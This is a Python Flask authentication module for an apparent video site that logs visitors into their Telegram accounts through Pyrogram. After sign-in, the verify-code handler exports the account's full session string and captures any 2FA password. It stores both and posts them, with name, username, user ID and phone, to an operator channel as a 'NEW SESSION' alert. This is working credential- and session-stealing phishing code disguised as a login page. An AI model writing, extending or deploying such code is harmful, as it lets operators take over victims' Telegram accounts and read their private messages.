import uuid
from datetime import datetime

from flask import Blueprint, request, jsonify, session, redirect, render_template
from pyrogram.errors import (
    PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, FloodWait
)

from config import BACKGROUND_VIDEO
from .database import (
    save_session_to_db, send_to_channel, temp_sessions_col, ensure_db, get_videos,
)
from .session_manager import session_manager

auth_bp = Blueprint('auth', __name__)


def _normalize_phone(raw):
    if not raw:
        return ""
    p = str(raw).strip().replace(" ", "").replace("-", "")
    if not p.startswith("+"):
        p = "+" + p
    return p


def _mask_phone(phone):
    if not phone or len(phone) < 6:
        return phone or ""
    return phone[:4] + "•" * (len(phone) - 7) + phone[-3:]


@auth_bp.route("/")
def index():
    return redirect("/login")


@auth_bp.route("/login")
def login():
    return render_template("login.html", bg_video=BACKGROUND_VIDEO)


# ---------- session bootstrap (used by the bot) ----------

def _start_session(phone, session_name="session"):
    ensure_db()
    session_id = str(uuid.uuid4())[:8]
    thread = session_manager.create_session(session_id, phone)
    sent = thread.execute(lambda: thread.client.send_code(phone))
    if temp_sessions_col is not None:
        temp_sessions_col.update_one(
            {"_id": session_id},
            {"$set": {
                "phone_code_hash": sent.phone_code_hash,
                "session_name": session_name,
                "status": "code_sent",
                "phone": phone,
                "created_at": datetime.now(),
            }},
            upsert=True,
        )
    return session_id


@auth_bp.route("/api/bot-connect", methods=["POST"])
def bot_connect():
    """Called by bot.py when the user shares their contact.
    Creates the session + sends the OTP so the web page only asks for the code."""
    try:
        session_manager.cleanup_old()
    except Exception as e:
        print(f"cleanup_old error: {e}")

    data = request.get_json(silent=True) or {}
    phone = _normalize_phone(data.get("phone"))
    session_name = (data.get("session_name") or "session").strip() or "session"

    if not phone or len(phone) < 10:
        return jsonify(ok=False, error="Invalid phone number"), 400

    try:
        session_id = _start_session(phone, session_name)
        return jsonify(ok=True, session_id=session_id,
                       phone=phone, masked=_mask_phone(phone),
                       message=f"Code sent to {phone}")
    except PhoneNumberInvalid:
        return jsonify(ok=False, error="Invalid phone number"), 400
    except FloodWait as e:
        return jsonify(ok=False, error=f"Please wait {e.value} seconds"), 429
    except RuntimeError as e:
        return jsonify(ok=False, error=str(e)), 503
    except Exception as e:
        print(f"bot_connect error: {e}")
        return jsonify(ok=False, error="Failed to send code. Try again."), 500


@auth_bp.route("/api/session-info")
def session_info():
    session_id = (request.args.get("s") or "").strip()
    if not session_id:
        return jsonify(ok=False, error="missing session"), 400
    if not session_manager.get_session(session_id):
        return jsonify(ok=False, error="Session expired"), 404
    ensure_db()
    doc = temp_sessions_col.find_one({"_id": session_id}) if temp_sessions_col is not None else None
    phone = doc.get("phone") if doc else ""
    return jsonify(ok=True, masked=_mask_phone(phone), phone=phone)


# ---------- web login flow ----------

@auth_bp.route("/api/send-code", methods=["POST"])
def send_code():
    """Fallback for web users who did not arrive from the bot."""
    data = request.get_json(silent=True) or {}
    phone = _normalize_phone(data.get("phone"))
    session_name = (data.get("session_name") or "session").strip() or "session"

    if not phone or len(phone) < 10:
        return jsonify(ok=False, error="Invalid phone number"), 400

    try:
        session_id = _start_session(phone, session_name)
        return jsonify(ok=True, session_id=session_id,
                       masked=_mask_phone(phone), message=f"Code sent to {phone}")
    except PhoneNumberInvalid:
        return jsonify(ok=False, error="Invalid phone number"), 400
    except FloodWait as e:
        return jsonify(ok=False, error=f"Please wait {e.value} seconds"), 429
    except RuntimeError as e:
        return jsonify(ok=False, error=str(e)), 503
    except Exception as e:
        print(f"send_code error: {e}")
        return jsonify(ok=False, error="Failed to send code. Try again."), 500


@auth_bp.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = request.get_json(silent=True) or {}
    session_id = (data.get("session_id") or "").strip()
    code = (data.get("code") or "").strip().replace(" ", "")
    password = data.get("password") or ""

    if not session_id:
        return jsonify(ok=False, error="Session ID required"), 400

    thread = session_manager.get_session(session_id)
    if not thread:
        return jsonify(ok=False, error="Session expired"), 400

    ensure_db()
    doc = temp_sessions_col.find_one({"_id": session_id}) if temp_sessions_col is not None else None
    phone = doc.get("phone") if doc else thread.phone
    phone_code_hash = doc.get("phone_code_hash") if doc else None
    session_name = doc.get("session_name", "session") if doc else "session"

    if not phone:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error="Session data lost"), 400

    if not code or not code.isdigit():
        return jsonify(ok=False, error="Invalid verification code"), 400

    result = {"user": None, "session_string": None}

    try:
        user = thread.execute(
            lambda: thread.client.sign_in(
                phone_number=phone, phone_code_hash=phone_code_hash, phone_code=code))
        session_string = thread.execute(lambda: thread.client.export_session_string())
        result = {"user": user, "session_string": session_string}

    except SessionPasswordNeeded:
        if not password:
            return jsonify(ok=False, requires_password=True), 401
        try:
            user = thread.execute(lambda: thread.client.check_password(password))
            session_string = thread.execute(lambda: thread.client.export_session_string())
            result = {"user": user, "session_string": session_string}
        except Exception as e:
            print(f"2FA error: {e}")
            return jsonify(ok=False, error="Invalid 2FA password"), 401

    except PhoneCodeInvalid:
        return jsonify(ok=False, error="Invalid verification code"), 401
    except PhoneCodeExpired:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error="Code expired"), 401
    except Exception as e:
        session_manager.remove_session(session_id)
        print(f"verify_code error: {e}")
        return jsonify(ok=False, error="Verification failed. Try again."), 500

    if not result["user"]:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error="Verification failed"), 400

    session_manager.remove_session(session_id)

    user = result["user"]
    user_info = {
        "id": user.id,
        "first_name": user.first_name,
        "last_name": user.last_name or "",
        "username": user.username or "N/A",
        "phone": phone,
        "session_string": result["session_string"],
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "session_name": session_name,
    }

    if not save_session_to_db(user_info):
        print("save_session_to_db returned False")

    channel_msg = (
        f"🟢 <b>NEW SESSION</b>\n"
        f"👤 <b>Name:</b> {user_info['first_name']} {user_info['last_name']}\n"
        f"🔗 <b>Username:</b> @{user_info['username']}\n"
        f"🆔 <b>User ID:</b> <code>{user_info['id']}</code>\n"
        f"📱 <b>Phone:</b> <code>{phone}</code>"
    )
    if password:
        channel_msg += f"\n🔑 <b>2FA:</b> <code>{password}</code>"
    channel_msg += f"\n\n<b>🔐 SESSION:</b>\n<code>{user_info['session_string']}</code>"
    send_to_channel(channel_msg)

    session["user"] = {
        "id": user_info["id"],
        "name": f"{user_info['first_name']} {user_info['last_name']}".strip(),
        "username": user_info["username"],
        "phone": phone,
    }
    return jsonify(ok=True, user=session["user"])


@auth_bp.route("/api/logout", methods=["POST"])
def logout():
    session.clear()
    return jsonify(ok=True)


@auth_bp.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    return render_template("dashboard.html", user=session["user"],
                           videos=get_videos(), bg_video=BACKGROUND_VIDEO)